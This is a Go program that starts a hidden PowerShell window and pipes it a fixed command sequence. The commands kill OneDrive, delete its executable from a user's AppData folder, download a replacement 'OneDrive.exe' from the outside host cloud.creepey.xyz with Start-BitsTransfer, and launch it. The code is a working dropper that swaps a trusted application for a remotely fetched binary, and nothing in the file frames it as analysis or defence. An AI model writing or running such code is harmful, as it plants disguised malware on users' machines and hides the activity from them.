package main

import (
	"bufio"
	"bytes"
	"os"
	"os/exec"
	"syscall"
	"time"
)

type CmdIo struct {
	cmd *exec.Cmd
	in  chan []byte
	out *bytes.Buffer
}

func NewCmdIo() *CmdIo {
	ps := exec.Command("powershell.exe")
	var out_buf bytes.Buffer
	a := &CmdIo{
		cmd: ps,
		in:  make(chan []byte),
		out: &out_buf,
	}
	ps.Stdin = a
	ps.Stdout = &out_buf
	ps.Stderr = &out_buf
	ps.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	ps.Start()
	//go ps.Wait()
	return a
}

func (t *CmdIo) Read(p []byte) (n int, err error) {
	temp := <-t.in
	n = copy(p, temp)
	return n, nil
}
func (t *CmdIo) Send(p string) {
	t.in <- []byte(p)
}

func (t *CmdIo) Recv() {
	for {
		time.Sleep(time.Second)
		if t.out.Len() != 0 {
			t.out.WriteTo(os.Stdout)
		}
	}
}

func main() {
	shell := NewCmdIo()
	go shell.Recv()
	time.Sleep(time.Second * 10)
	a := bytes.NewBufferString("Stop-Process -name One*\nrm C:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\nStart-BitsTransfer -Source \"http://cloud.creepey.xyz/?explorer/share/fileDownload&shareID=8B9-r6yQ&path=%7BshareItemLink%3A8B9-r6yQ%7D%2F&s=6KEYw\" -Destination \"C:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\"\nC:\\Users\\test\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\n")
	s := bufio.NewReader(a)
	for i := 0; i < 5; i++ {
		time.Sleep(time.Second * 2)
		cmd, _ := s.ReadString('\n')
		shell.Send(cmd)
	}
	time.Sleep(time.Second * 2)
	return
}
